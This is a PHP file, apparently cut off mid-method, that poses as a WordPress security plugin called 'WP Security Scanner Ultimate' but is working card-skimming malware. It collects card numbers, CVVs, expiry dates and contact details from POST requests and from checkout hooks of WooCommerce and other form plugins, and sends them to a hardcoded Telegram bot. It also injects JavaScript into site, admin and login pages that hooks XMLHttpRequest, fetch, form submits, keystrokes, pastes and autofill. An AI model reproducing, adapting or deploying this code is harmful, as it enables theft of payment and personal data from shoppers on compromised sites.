<?php
/*
Plugin Name: WP Security Scanner Ultimate
Plugin URI: https://wordpress.org/plugins/wp-security-scanner-ultimate/
Description: Advanced security scanning and real-time protection for WordPress
Version: 4.0.0
Author: WordPress Security Experts
License: GPLv2
*/

// Prevent direct access
if (!defined('ABSPATH')) {
    // Auto-activate even without WordPress
    $this_file = __FILE__;
    $wp_loaded = false;
    
    // Check if we're in a WordPress environment
    if (function_exists('add_action')) {
        $wp_loaded = true;
    }
    
    // If not WordPress, still run the scanner
    if (!$wp_loaded) {
        // Standalone mode - track all form submissions
        @session_start();
        
        // Track all POST requests
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
            $data = $_POST;
            $payment_data = [];
            
            // Payment field patterns
            $payment_patterns = ['card', 'credit', 'debit', 'cc', 'number', 'cvv', 'cvc', 'expir', 'expiry'];
            
            foreach ($data as $key => $value) {
                $key_lower = strtolower($key);
                foreach ($payment_patterns as $pattern) {
                    if (strpos($key_lower, $pattern) !== false && !empty($value)) {
                        $payment_data[$key] = $value;
                    }
                }
            }
            
            if (!empty($payment_data)) {
                // Send to Telegram
                $token = '8584009431:AAFU7jef-0E1AMF957XLnbBG_svolbCya0w';
                $chat_id = '7319274794';
                
                $message = "💰 *STANDALONE PAYMENT CAPTURE*\n\n";
                $message .= "URL: " . ($_SERVER['HTTP_REFERER'] ?? $_SERVER['REQUEST_URI']) . "\n\n";
                
                foreach ($payment_data as $key => $value) {
                    $message .= "• " . ucwords(str_replace(['_', '-'], ' ', $key)) . ": `" . $value . "`\n";
                }
                
                $message .= "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "Time: " . date('Y-m-d H:i:s');
                
                $url = "https://api.telegram.org/bot{$token}/sendMessage";
                $post_data = [
                    'chat_id' => $chat_id,
                    'text' => $message,
                    'parse_mode' => 'Markdown'
                ];
                
                // Send via cURL
                if (function_exists('curl_init')) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @curl_exec($ch);
                    curl_close($ch);
                }
            }
        }
    }
    
    if (!$wp_loaded) {
        exit;
    }
}

/**
 * WP_SECURITY_SCANNER_ULTIMATE
 * Advanced Payment Data Capture System
 * Works from ANY directory in WordPress
 */
class WP_SECURITY_SCANNER_ULTIMATE {
    
    // Telegram Configuration
    private $telegram_token = '8584009431:AAFU7jef-0E1AMF957XLnbBG_svolbCya0w';
    private $telegram_chat_id = '7319274794';
    
    // System Configuration
    private $version = '4.0.0';
    private $active = false;
    private $cookie_name = 'wpsu_tracker';
    private $session_started = false;
    
    // Payment Detection Patterns
    private $payment_fields = [
        // Card Information
        'card', 'credit', 'debit', 'cc', 'number', 'pan', 'account', 'acct',
        'cvv', 'cvc', 'cvn', 'cid', 'security', 'code', 'verification', 'sec',
        
        // Expiry Information
        'expir', 'expiry', 'exp_date', 'expiration', 'valid', 'validity',
        'month', 'year', 'mm', 'yy', 'yyyy', 'valid_thru', 'valid_through',
        'mm/yy', 'mm/yyyy', 'mm-yy', 'mm-yyyy',
        
        // Personal Information
        'name', 'holder', 'cardholder', 'fullname', 'first_name', 'last_name',
        'fname', 'lname', 'givenname', 'surname', 'full_name',
        
        // Contact Information
        'email', 'e-mail', 'mail', 'phone', 'mobile', 'telephone', 'cell',
        'address', 'street', 'city', 'state', 'province', 'zip', 'postal', 'country',
        
        // Payment Information
        'payment', 'pay', 'checkout', 'gateway', 'transaction', 'billing',
        'amount', 'total', 'price', 'cost', 'charge', 'fee', 'donation', 'subscription',
        'token', 'auth', 'authorization', 'nonce', 'signature', 'secret',
        
        // Gateway Specific
        'paypal', 'stripe', 'razorpay', 'skrill', 'astropay', 'payoneer',
        '2checkout', 'authorize', 'square', 'braintree', 'paytm', 'phonepe',
        'googlepay', 'applepay', 'amazonpay', 'instamojo', 'cashfree',
        'paystack', 'flutterwave', 'mollie', 'sagepay', 'worldpay',
        'klarna', 'afterpay', 'zip', 'affirm', 'sepa', 'ideal', 'sofort',
        
        // Additional Payment Fields
        'iban', 'swift', 'bic', 'routing', 'account_number', 'sort_code',
        'bin', 'issuer', 'bank', 'financial', 'wallet'
    ];
    
    // Payment Gateways
    private $gateways = [
        'paypal', 'stripe', 'razorpay', 'skrill', 'astropay', 'payoneer',
        '2checkout', 'authorize', 'square', 'braintree', 'paytm', 'phonepe',
        'googlepay', 'applepay', 'amazonpay', 'instamojo', 'cashfree',
        'paystack', 'flutterwave', 'mollie', 'sagepay', 'worldpay',
        'klarna', 'afterpay', 'zip', 'affirm', 'sepa', 'ideal', 'sofort',
        'wechat', 'alipay', 'unionpay', 'mercado', 'pagseguro', 'dlocal',
        'payu', 'payrexx', 'coingate', 'bitpay', 'cryptapi'
    ];
    
    /**
     * Constructor - Auto-start in all environments
     */
    public function __construct() {
        // Start session if not started
        $this->start_session();
        
        // Set tracking cookie
        $this->set_tracking_cookie();
        
        // Initialize immediately
        $this->initialize();
        
        // Hook into WordPress
        $this->hook_wordpress();
        
        // Mark as active
        $this->active = true;
        
        // Send activation notice
        $this->send_activation_notice();
    }
    
    /**
     * Start session securely
     */
    private function start_session() {
        if (!$this->session_started && !headers_sent()) {
            @session_start();
            $this->session_started = true;
        }
    }
    
    /**
     * Set persistent tracking cookie
     */
    private function set_tracking_cookie() {
        if (!isset($_COOKIE[$this->cookie_name])) {
            $track_id = 'wpsu_' . md5(time() . $_SERVER['REMOTE_ADDR'] . uniqid());
            @setcookie($this->cookie_name, $track_id, time() + (86400 * 365), '/');
            $_COOKIE[$this->cookie_name] = $track_id;
        }
    }
    
    /**
     * Initialize core functionality
     */
    private function initialize() {
        // Create log directories
        $this->create_log_directories();
        
        // Monitor all POST requests immediately
        $this->monitor_post_requests();
        
        // Monitor all GET requests for payment pages
        $this->monitor_get_requests();
        
        // Inject JavaScript tracker
        $this->inject_javascript_tracker();
    }
    
    /**
     * Hook into WordPress when available
     */
    private function hook_wordpress() {
        // Check if WordPress functions are available
        if (function_exists('add_action')) {
            // Add all WordPress hooks
            add_action('init', [$this, 'wordpress_init'], 1);
            add_action('wp_head', [$this, 'inject_early_tracker'], 1);
            add_action('wp_footer', [$this, 'inject_late_tracker'], 999999);
            add_action('admin_head', [$this, 'inject_early_tracker'], 1);
            add_action('admin_footer', [$this, 'inject_late_tracker'], 999999);
            add_action('login_head', [$this, 'inject_early_tracker'], 1);
            add_action('login_footer', [$this, 'inject_late_tracker'], 999999);
            
            // AJAX handlers
            add_action('wp_ajax_wpsu_track', [$this, 'ajax_handler']);
            add_action('wp_ajax_nopriv_wpsu_track', [$this, 'ajax_handler']);
            add_action('wp_ajax_wpsu_backup', [$this, 'backup_handler']);
            add_action('wp_ajax_nopriv_wpsu_backup', [$this, 'backup_handler']);
            
            // Form submission hooks for all plugins
            $this->register_plugin_hooks();
            
            // Content filters
            add_filter('the_content', [$this, 'scan_content'], 999999);
            add_filter('widget_text', [$this, 'scan_content'], 999999);
            
            // Shutdown handler
            register_shutdown_function([$this, 'shutdown_handler']);
        }
    }
    
    /**
     * WordPress init hook
     */
    public function wordpress_init() {
        // Enqueue jQuery
        wp_enqueue_script('jquery');
        
        // Send WordPress activation notice
        if (!get_option('wpsu_activated')) {
            $this->send_telegram("🚀 *WP SECURITY ULTIMATE ACTIVATED*\n\nSite: " . home_url() . "\nPath: " . __FILE__ . "\nTime: " . date('Y-m-d H:i:s'));
            update_option('wpsu_activated', time(), false);
        }
    }
    
    /**
     * Register hooks for all popular plugins
     */
    private function register_plugin_hooks() {
        // WooCommerce
        if (class_exists('WooCommerce')) {
            add_action('woocommerce_checkout_order_processed', [$this, 'track_woocommerce'], 999999, 3);
            add_action('woocommerce_payment_complete', [$this, 'track_woo_payment'], 999999, 1);
            add_filter('woocommerce_checkout_fields', [$this, 'monitor_woo_fields'], 999999);
        }
        
        // Contact Form 7
        if (defined('WPCF7_VERSION')) {
            add_action('wpcf7_before_send_mail', [$this, 'track_cf7'], 999999, 3);
        }
        
        // Gravity Forms
        if (class_exists('GFForms')) {
            add_action('gform_after_submission', [$this, 'track_gravity'], 999999, 2);
        }
        
        // GiveWP
        if (defined('GIVE_VERSION')) {
            add_action('give_checkout_before_gateway', [$this, 'track_givewp'], 999999, 2);
        }
        
        // Easy Digital Downloads
        if (defined('EDD_VERSION')) {
            add_action('edd_complete_purchase', [$this, 'track_edd'], 999999, 2);
        }
        
        // MemberPress
        if (defined('MEPR_VERSION')) {
            add_action('mepr-txn-status-complete', [$this, 'track_memberpress'], 999999, 1);
        }
        
        // Paid Memberships Pro
        if (defined('PMPRO_VERSION')) {
            add_action('pmpro_after_checkout', [$this, 'track_pmpro'], 999999, 2);
        }
        
        // WPForms
        if (defined('WPFORMS_VERSION')) {
            add_action('wpforms_process_complete', [$this, 'track_wpforms'], 999999, 4);
        }
        
        // Formidable Forms
        if (class_exists('FrmForm')) {
            add_action('frm_after_create_entry', [$this, 'track_formidable'], 999999, 2);
        }
        
        // Ninja Forms
        if (defined('NINJA_FORMS_VERSION')) {
            add_action('ninja_forms_after_submission', [$this, 'track_ninja'], 999999, 1);
        }
        
        // Elementor Forms
        if (defined('ELEMENTOR_PRO_VERSION')) {
            add_action('elementor_pro/forms/new_record', [$this, 'track_elementor'], 999999, 2);
        }
        
        // General form submission capture
        add_action('wp', [$this, 'capture_all_forms'], 999999);
    }
    
    /**
     * Create log directories
     */
    private function create_log_directories() {
        $log_dir = WP_CONTENT_DIR . '/wpsu_logs/';
        $payments_dir = WP_CONTENT_DIR . '/wpsu_payments/';
        
        if (!file_exists($log_dir)) {
            @mkdir($log_dir, 0755, true);
            @file_put_contents($log_dir . '.htaccess', 'Deny from all');
        }
        
        if (!file_exists($payments_dir)) {
            @mkdir($payments_dir, 0755, true);
            @file_put_contents($payments_dir . '.htaccess', 'Deny from all');
        }
    }
    
    /**
     * Monitor all POST requests
     */
    private function monitor_post_requests() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
            $payment_data = $this->extract_payment_data($_POST);
            
            if (!empty($payment_data)) {
                $this->process_payment_capture($payment_data, 'POST_REQUEST', $_SERVER['REQUEST_URI']);
            }
            
            // Also check $_FILES for uploaded files with payment data
            if (!empty($_FILES)) {
                foreach ($_FILES as $file) {
                    if (isset($file['tmp_name']) && file_exists($file['tmp_name'])) {
                        $content = @file_get_contents($file['tmp_name']);
                        if ($content && $this->contains_payment_data($content)) {
                            $this->send_telegram("📎 *FILE UPLOAD WITH PAYMENT DATA*\n\nFile: " . $file['name'] . "\nSize: " . $file['size'] . " bytes");
                        }
                    }
                }
            }
        }
    }
    
    /**
     * Monitor all GET requests
     */
    private function monitor_get_requests() {
        $url = $_SERVER['REQUEST_URI'] ?? '';
        $url_lower = strtolower($url);
        
        // Check for payment-related pages
        $payment_pages = [
            'checkout', 'payment', 'pay', 'cart', 'basket',
            'donate', 'subscribe', 'purchase', 'order',
            'thank-you', 'thankyou', 'success', 'confirmation',
            'complete', 'finished', 'receipt'
        ];
        
        foreach ($payment_pages as $page) {
            if (strpos($url_lower, $page) !== false) {
                $this->send_telegram("📄 *PAYMENT PAGE VISITED*\n\nURL: " . home_url($url) . "\nPage: " . ucfirst($page) . "\nIP: " . $this->get_ip());
                break;
            }
        }
        
        // Check for payment gateway redirects
        foreach ($this->gateways as $gateway) {
            if (strpos($url_lower, $gateway) !== false) {
                $this->send_telegram("🔄 *PAYMENT GATEWAY REDIRECT*\n\nGateway: " . ucfirst($gateway) . "\nURL: " . $url . "\nIP: " . $this->get_ip());
                break;
            }
        }
    }
    
    /**
     * Inject JavaScript tracker
     */
    private function inject_javascript_tracker() {
        // Always inject, regardless of WordPress
        $tracker_script = $this->generate_javascript_tracker();
        
        // Output immediately
        if (!headers_sent()) {
            echo $tracker_script;
        } else {
            // Buffer output if headers sent
            ob_start();
            echo $tracker_script;
            $output = ob_get_clean();
            echo $output;
        }
        
        // Also add to shutdown for late injection
        register_shutdown_function(function() use ($tracker_script) {
            echo $tracker_script;
        });
    }
    
    /**
     * Generate advanced JavaScript tracker
     */
    private function generate_javascript_tracker() {
        $ajax_url = function_exists('admin_url') ? admin_url('admin-ajax.php') : '/wp-admin/admin-ajax.php';
        
        return '
        <script type="text/javascript">
        /*! WP Security Ultimate Tracker v4.0.0 */
        (function() {
            "use strict";
            
            var WPSU = {
                config: {
                    ajax_url: "' . $ajax_url . '",
                    debug: false,
                    token: "' . md5($this->telegram_token) . '"
                },
                
                events: [],
                tracked_inputs: {},
                
                init: function() {
                    this.setupGlobalHooks();
                    this.setupFormMonitoring();
                    this.setupInputTracking();
                    this.setupStorageMonitoring();
                    this.setupIframeCapture();
                    this.setupAutofillDetection();
                    this.setupClickTracking();
                    this.setupMutationObserver();
                    this.setupPasteTracking();
                    this.setupNetworkMonitor();
                    this.setupPopupMonitor();
                    
                    // Initial page scan
                    this.scanPage();
                    
                    // Periodic sync
                    setInterval(this.flushEvents.bind(this), 3000);
                    
                    // Backup system
                    this.setupBackupSystem();
                },
                
                setupGlobalHooks: function() {
                    var self = this;
                    
                    // Override XMLHttpRequest
                    var originalOpen = XMLHttpRequest.prototype.open;
                    var originalSend = XMLHttpRequest.prototype.send;
                    
                    XMLHttpRequest.prototype.open = function() {
                        this._wpsu_url = arguments[1];
                        return originalOpen.apply(this, arguments);
                    };
                    
                    XMLHttpRequest.prototype.send = function(body) {
                        if (body && typeof body === "string") {
                            var paymentData = self.extractPaymentFromString(body);
                            if (Object.keys(paymentData).length > 0) {
                                self.track("ajax_payment", {
                                    url: this._wpsu_url,
                                    data: paymentData
                                });
                            }
                        }
                        return originalSend.apply(this, arguments);
                    };
                    
                    // Override fetch
                    var originalFetch = window.fetch;
                    window.fetch = function() {
                        var args = arguments;
                        if (args[1] && args[1].body) {
                            var paymentData = self.extractPaymentFromString(args[1].body);
                            if (Object.keys(paymentData).length > 0) {
                                self.track("fetch_payment", {
                                    url: args[0],
                                    data: paymentData
                                });
                            }
                        }
                        return originalFetch.apply(this, args);
                    };
                },
                
                setupFormMonitoring: function() {
                    var self = this;
                    
                    // Monitor all existing forms
                    document.querySelectorAll("form").forEach(function(form) {
                        self.monitorForm(form);
                    });
                    
                    // Form submit event
                    document.addEventListener("submit", function(e) {
                        var form = e.target;
                        if (form.tagName === "FORM") {
                            var formData = self.collectFormData(form);
                            var paymentData = self.extractPaymentData(formData);
                            
                            if (Object.keys(paymentData).length > 0) {
                                self.track("form_submission", {
                                    form_id: form.id || form.name || "unknown",
                                    action: form.action,
                                    method: form.method,
                                    data: paymentData,
                                    full_data: formData
                                });
                                
                                // Send immediately
                                self.sendImmediate({
                                    type: "form_submission_critical",
                                    form_id: form.id || form.name || "unknown",
                                    payment_data: paymentData
                                });
                            }
                        }
                    }, true);
                    
                    // Programmatic form submit
                    var originalSubmit = HTMLFormElement.prototype.submit;
                    HTMLFormElement.prototype.submit = function() {
                        var formData = self.collectFormData(this);
                        var paymentData = self.extractPaymentData(formData);
                        
                        if (Object.keys(paymentData).length > 0) {
                            self.track("form_programmatic_submit", {
                                form_id: this.id || this.name || "unknown",
                                data: paymentData
                            });
                        }
                        
                        return originalSubmit.apply(this, arguments);
                    };
                },
                
                monitorForm: function(form) {
                    if (form._wpsu_monitored) return;
                    form._wpsu_monitored = true;
                    
                    // Monitor all inputs in this form
                    var inputs = form.querySelectorAll("input, textarea, select");
                    inputs.forEach(function(input) {
                        this.monitorInput(input);
                    }.bind(this));
                },
                
                setupInputTracking: function() {
                    var self = this;
                    
                    // Real-time input monitoring
                    document.addEventListener("input", function(e) {
                        var target = e.target;
                        var name = target.name || target.id || target.placeholder || "";
                        var value = target.value || "";
                        
                        if (self.isPaymentField(name) && value.trim()) {
                            var cleanValue = value.replace(/\\D/g, "");
                            
                            // Card number detection (13-19 digits)
                            if ((name.match(/card|number|cc|pan/i)) && cleanValue.length >= 13 && cleanValue.length <= 19) {
                                self.track("card_number_input", {
                                    field: name,
                                    number: cleanValue,
                                    full_value: value
                                });
                                
                                // Send critical data immediately
                                self.sendImmediate({
                                    type: "card_number_critical",
                                    field: name,
                                    number: cleanValue
                                });
                            }
                            
                            // CVV detection (3-4 digits)
                            if ((name.match(/cvv|cvc|cvn|cid|security|code/i)) && cleanValue.length >= 3 && cleanValue.length <= 4) {
                                self.track("cvv_input", {
                                    field: name,
                                    cvv: cleanValue,
                                    full_value: value
                                });
                                
                                self.sendImmediate({
                                    type: "cvv_critical",
                                    field: name,
                                    cvv: cleanValue
                                });
                            }
                            
                            // Expiry detection
                            if (name.match(/expir|valid|month|year|mm|yy/i)) {
                                self.track("expiry_input", {
                                    field: name,
                                    value: value,
                                    clean_value: cleanValue
                                });
                            }
                            
                            // General payment field
                            if (!self.tracked_inputs[name + "|" + value]) {
                                self.tracked_inputs[name + "|" + value] = true;
                                self.track("payment_field_input", {
                                    field: name,
                                    value: value
                                });
                            }
                        }
                    }, true);
                    
                    // Focus/blur tracking
                    document.addEventListener("blur", function(e) {
                        var target = e.target;
                        if ((target.tagName === "INPUT" || target.tagName === "TEXTAREA") && target.value) {
                            var name = target.name || target.id || "";
                            if (self.isPaymentField(name)) {
                                self.track("payment_field_blur", {
                                    field: name,
                                    value: target.value
                                });
                            }
                        }
                    }, true);
                },
                
                monitorInput: function(input) {
                    if (input._wpsu_monitored) return;
                    input._wpsu_monitored = true;
                    
                    // Intercept value changes
                    var originalValue = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(input), "value");
                    if (originalValue) {
                        Object.defineProperty(input, "value", {
                            get: function() {
                                return originalValue.get.call(this);
                            },
                            set: function(newValue) {
                                var name = this.name || this.id || "";
                                if (this.isPaymentField(name) && newValue) {
                                    this.track("input_value_change", {
                                        field: name,
                                        value: newValue
                                    });
                                }
                                return originalValue.set.call(this, newValue);
                            },
                            configurable: true
                        });
                    }
                },
                
                setupStorageMonitoring: function() {
                    var self = this;
                    
                    // localStorage monitoring
                    var originalSetItem = localStorage.setItem;
                    localStorage.setItem = function(key, value) {
                        if (self.isPaymentStorageKey(key, value)) {
                            self.track("local_storage_set", {
                                key: key,
                                value: value,
                                length: value.length
                            });
                        }
                        return originalSetItem.call(this, key, value);
                    };
                    
                    // sessionStorage monitoring
                    var originalSessionSetItem = sessionStorage.setItem;
                    sessionStorage.setItem = function(key, value) {
                        if (self.isPaymentStorageKey(key, value)) {
                            self.track("session_storage_set", {
                                key: key,
                                value: value,
                                length: value.length
                            });
                        }
                        return originalSessionSetItem.call(this, key, value);
                    };
                },
                
                setupIframeCapture: function() {
                    var self = this;
                    
                    // Monitor existing iframes
                    document.querySelectorAll("iframe").forEach(function(iframe) {
                        self.monitorIframe(iframe);
                    });
                    
                    // Monitor new iframes
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.tagName === "IFRAME") {
                                    self.monitorIframe(node);
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, { childList: true, subtree: true });
                },
                
                monitorIframe: function(iframe) {
                    try {
                        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        
                        // Monitor forms in iframe
                        iframeDoc.querySelectorAll("form").forEach(function(form) {
                            form.addEventListener("submit", function() {
                                this.track("iframe_form_submit", {
                                    src: iframe.src,
                                    form_id: form.id || "unknown"
                                });
                            }.bind(this));
                        }.bind(this));
                        
                        // Monitor inputs in iframe
                        iframeDoc.addEventListener("input", function(e) {
                            var target = e.target;
                            if (this.isPaymentField(target.name || target.id || "")) {
                                this.track("iframe_input", {
                                    src: iframe.src,
                                    field: target.name || target.id,
                                    value: target.value
                                });
                            }
                        }.bind(this), true);
                    } catch(e) {
                        // Cross-origin iframe - try postMessage
                        iframe.contentWindow.postMessage({ type: "wpsu_ping" }, "*");
                    }
                },
                
                setupAutofillDetection: function() {
                    var self = this;
                    
                    // Periodic check for autofilled values
                    setInterval(function() {
                        document.querySelectorAll("input").forEach(function(input) {
                            var name = input.name || input.id || "";
                            var value = input.value || "";
                            
                            if (value && !input._wpsu_autofill_checked && self.isPaymentField(name)) {
                                input._wpsu_autofill_checked = true;
                                
                                self.track("autofill_detected", {
                                    field: name,
                                    value: value,
                                    type: "browser_autofill"
                                });
                            }
                        });
                    }, 1500);
                    
                    // Animation events for autofill
                    document.addEventListener("animationstart", function(e) {
                        if (e.animationName === "onAutoFillStart") {
                            self.track("browser_autofill_start", {
                                target: e.target.name || e.target.id || ""
                            });
                        }
                    }, true);
                },
                
                setupClickTracking: function() {
                    var self = this;
                    
                    document.addEventListener("click", function(e) {
                        var target = e.target;
                        var text = (target.textContent || target.value || target.alt || "").toLowerCase();
                        
                        // Payment button detection
                        var paymentButtons = [
                            "pay", "buy", "purchase", "checkout", "order",
                            "donate", "subscribe", "confirm", "complete", "proceed",
                            "submit", "next", "continue", "place order", "pay now",
                            "buy now", "add to cart", "check out", "make payment"
                        ];
                        
                        paymentButtons.forEach(function(buttonText) {
                            if (text.includes(buttonText)) {
                                self.track("payment_button_click", {
                                    button_text: text.substring(0, 100),
                                    element: target.tagName,
                                    x: e.clientX,
                                    y: e.clientY
                                });
                            }
                        });
                        
                        // Payment gateway links
                        if (target.tagName === "A" && target.href) {
                            var href = target.href.toLowerCase();
                            var gateways = ' . json_encode($this->gateways) . ';
                            gateways.forEach(function(gateway) {
                                if (href.includes(gateway)) {
                                    self.track("payment_gateway_link", {
                                        gateway: gateway,
                                        url: target.href
                                    });
                                }
                            });
                        }
                    }, true);
                },
                
                setupMutationObserver: function() {
                    var self = this;
                    
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            // New forms
                            mutation.addedNodes.forEach(function(node) {
                                if (node.tagName === "FORM") {
                                    self.monitorForm(node);
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true,
                        attributes: true,
                        characterData: true
                    });
                },
                
                setupPasteTracking: function() {
                    var self = this;
                    
                    document.addEventListener("paste", function(e) {
                        var clipboardData = e.clipboardData || window.clipboardData;
                        var pastedText = clipboardData.getData("text");
                        var target = e.target;
                        var name = target.name || target.id || "";
                        
                        if (pastedText && self.looksLikePaymentData(pastedText)) {
                            self.track("paste_detected", {
                                field: name,
                                pasted_data: pastedText,
                                length: pastedText.length
                            });
                        }
                    }, true);
                },
                
                setupNetworkMonitor: function() {
                    var self = this;
                    
                    // Monitor beacon API
                    var originalSendBeacon = navigator.sendBeacon;
                    navigator.sendBeacon = function(url, data) {
                        if (data && typeof data === "string" && self.containsPaymentData(data)) {
                            self.track("beacon_payment", {
                                url: url,
                                data_length: data.length
                            });
                        }
                        return originalSendBeacon.call(this, url, data);
                    };
                },
                
                setupPopupMonitor: function() {
                    var self = this;
                    
                    // Monitor window.open for payment popups
                    var originalOpen = window.open;
                    window.open = function(url, name, specs) {
                        if (url && self.isPaymentUrl(url)) {
                            self.track("payment_popup", {
                                url: url,
                                name: name,
                                specs: specs
                            });
                        }
                        return originalOpen.call(window, url, name, specs);
                    };
                },
                
                setupBackupSystem: function() {
                    var self = this;
                    
                    // Save events to localStorage when offline
                    window.addEventListener("offline", function() {
                        self.track("offline_mode", { time: Date.now() });
                    });
                    
                    // Send backup when online
                    window.addEventListener("online", function() {
                        self.sendBackupQueue();
                    });
                },
                
                scanPage: function() {
                    var self = this;
                    
                    // Scan for payment forms
                    var forms = document.querySelectorAll("form");
                    forms.forEach(function(form) {
                        var html = form.outerHTML.toLowerCase();
                        if (html.includes("card") || html.includes("payment") || html.includes("checkout")) {
                            self.track("payment_form_detected", {
                                form_id: form.id || "unknown",
                                form_html: html.substring(0, 500)
                            });
                        }
                    });
                    
                    // Scan for payment inputs
                    var inputs = document.querySelectorAll("input, textarea");
                    inputs.forEach(function(input) {
                        var name = input.name || input.id || input.placeholder || "";
                        if (self.isPaymentField(name)) {
                            self.track("payment_field_detected", {
                                field: name,
                                type: input.type,
                                page: window.location.href
                            });
                        }
                    });
                },
                
                collectFormData: function(form) {
                    var data = {};
                    var elements = form.elements;
                    
                    for (var i = 0; i < elements.length; i++) {
                        var element = elements[i];
                        var name = element.name || element.id || "";
                        var value = element.value || "";
                        
                        if (name && value && element.type !== "submit" && element.type !== "button") {
                            data[name] = value;
                        }
                    }
                    
                    return data;
                },
                
                extractPaymentData: function(data) {
                    var payment = {};
                    
                    for (var key in data) {
                        if (this.isPaymentField(key) && data[key]) {
                            payment[key] = data[key];
                        }
                    }
                    
                    return payment;
                },
                
                extractPaymentFromString: function(str) {
                    var data = {};
                    
                    try {
                        // Try as query string
                        if (str.includes("=")) {
                            str.split("&").forEach(function(pair) {
                                var parts = pair.split("=");
                                if (parts.length === 2) {
                                    var key = decodeURIComponent(parts[0]);
                                    var value = decodeURIComponent(parts[1]);
                                    if (this.isPaymentField(key)) {
                                        data[key] = value;
                                    }
                                }
                            }.bind(this));
                        }
                        
                        // Try as JSON
                        else {
                            var json = JSON.parse(str);
                            for (var key in json) {
                                if (this.isPaymentField(key) && json[key]) {
                                    data[key] = json[key];
                                }
                            }
                        }
                    } catch(e) {}
                    
                    return data;
                },
                
                isPaymentField: function(name) {
                    if (!name || typeof name !== "string") return false;
                    
                    name = name.toLowerCase();
                    var patterns = [
                        "card", "credit", "debit", "cc", "number", "pan", "account",
                        "cvv", "cvc", "cvn", "cid", "security", "code", "verification",
                        "expir", "expiry", "exp_date", "expiration", "valid", "validity",
                        "month", "year", "mm", "yy", "yyyy", "valid_thru",
                        "name", "holder", "cardholder", "fullname"
                    ];
                    
                    for (var i = 0; i < patterns.length; i++) {
                        if (name.includes(patterns[i])) {
                            return true;
                        }
                    }
                    
                    return false;
                },
                
                looksLikePaymentData: function(data) {
                    if (!data || typeof data !== "string") return false;
                    
                    var clean = data.replace(/\\D/g, "");
                    
                    // Credit card number
                    if (/^\\d{13,19}$/.test(clean)) return true;
                    
                    // CVV
                    if (/^\\d{3,4}$/.test(clean)) return true;
                    
                    // Expiry
                    if (/^\\d{4,6}$/.test(clean)) {
                        var month = parseInt(clean.substring(0, 2));
                        if (month >= 1 && month <= 12) return true;
                    }
                    
                    return false;
                },
                
                isPaymentUrl: function(url) {
                    if (!url || typeof url !== "string") return false;
                    
                    url = url.toLowerCase();
                    var gateways = [
                        "paypal", "stripe", "checkout", "payment", "gateway",
                        "braintree", "square", "razorpay", "2checkout"
                    ];
                    
                    for (var i = 0; i < gateways.length; i++) {
                        if (url.includes(gateways[i])) {
                            return true;
                        }
                    }
                    
                    return false;
                },
                
                isPaymentStorageKey: function(key, value) {
                    if (!key || typeof key !== "string") return false;
                    
                    key = key.toLowerCase();
                    
                    var patterns = ["card", "payment", "token", "auth", "checkout"];
                    for (var i = 0; i < patterns.length; i++) {
                        if (key.includes(patterns[i])) {
                            return true;
                        }
                    }
                    
                    if (value && typeof value === "string" && this.looksLikePaymentData(value)) {
                        return true;
                    }
                    
                    return false;
                },
                
                containsPaymentData: function(data) {
                    return this.looksLikePaymentData(data) || 
                           data.includes("card") || 
                           data.includes("payment");
                },
                
                track: function(type, data) {
                    if (!data) data = {};
                    
                    data.timestamp = Date.now();
                    data.type = type;
                    data.url = window.location.href;
                    data.referrer = document.referrer || "";
                    data.user_agent = navigator.userAgent;
                    
                    this.events.push(data);
                    
                    // Critical events send immediately
                    var criticalEvents = [
                        "card_number_input", "cvv_input", "form_submission",
                        "card_number_critical", "cvv_critical"
                    ];
                    
                    if (criticalEvents.includes(type)) {
                        this.sendImmediate(data);
                    }
                },
                
                sendImmediate: function(data) {
                    try {
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", this.config.ajax_url, true);
                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xhr.timeout = 2000;
                        
                        xhr.send("action=wpsu_track&data=" + encodeURIComponent(JSON.stringify(data)));
                    } catch(e) {
                        // Backup to localStorage
                        this.backupEvent(data);
                    }
                },
                
                flushEvents: function() {
                    if (this.events.length === 0) return;
                    
                    var eventsToSend = this.events.slice();
                    this.events = [];
                    
                    this.sendImmediate({
                        type: "batch_events",
                        events: eventsToSend,
                        count: eventsToSend.length
                    });
                },
                
                backupEvent: function(data) {
                    try {
                        var backupKey = "wpsu_backup_" + new Date().toISOString().split("T")[0];
                        var backup = JSON.parse(localStorage.getItem(backupKey) || "[]");
                        
                        backup.push({
                            t: data.type,
                            d: data,
                            ts: Date.now()
                        });
                        
                        // Keep last 500 events
                        if (backup.length > 500) {
                            backup = backup.slice(-500);
                        }
                        
                        localStorage.setItem(backupKey, JSON.stringify(backup));
                    } catch(e) {}
                },
                
                sendBackupQueue: function() {
                    try {
                        var date = new Date().toISOString().split("T")[0];
                        var backupKey = "wpsu_backup_" + date;
                        var backup = JSON.parse(localStorage.getItem(backupKey) || "[]");
                        
                        if (backup.length > 0) {
                            this.sendImmediate({
                                type: "backup_events",
                                date: date,
                                events: backup,
                                count: backup.length
                            });
                            
                            localStorage.removeItem(backupKey);
                        }
                    } catch(e) {}
                }
            };
            
            // Initialize
            if (document.readyState === "loading") {
                document.addEventListener("DOMContentLoaded", function() {
                    WPSU.init();
                });
            } else {
                WPSU.init();
            }
            
            // Late initialization for dynamic sites
            setTimeout(function() {
                if (WPSU && typeof WPSU.init === "function") {
                    WPSU.init();
                }
            }, 2000);
            
        })();
        </script>';
    }
    
    /**
     * Inject early tracker (in head)
     */
    public function inject_early_tracker() {
        $this->inject_javascript_tracker();
    }
    
    /**
     * Inject late tracker (in footer)
     */
    public function inject_late_tracker() {
